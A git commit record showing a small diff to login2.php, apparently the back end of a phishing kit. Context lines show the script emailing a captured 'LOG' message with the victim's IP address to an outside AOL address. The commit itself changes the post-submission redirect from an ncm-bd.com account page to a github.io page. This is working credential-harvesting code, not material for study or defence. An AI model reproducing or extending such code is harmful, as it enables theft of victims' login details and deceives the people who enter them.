1a07317efde5945d370328fe423c5cf4ee1cb956
busybrain2233 <107110731+busybrain2233@users.noreply.github.com>
2022-06-08 18:46:10 +0100

    Update login2.php

--- login2.php
+++ login2.php
@@ -18,6 +18,6 @@ $to = "busybraintech@aol.com";
 
 $hi = mail($to,"LOG | ".$ip, $message);
 
-header ("location: https://ncm-bd.com/account/next.html")
+header ("location: https://busybrain2233.github.io/next.html")
 
 ?>
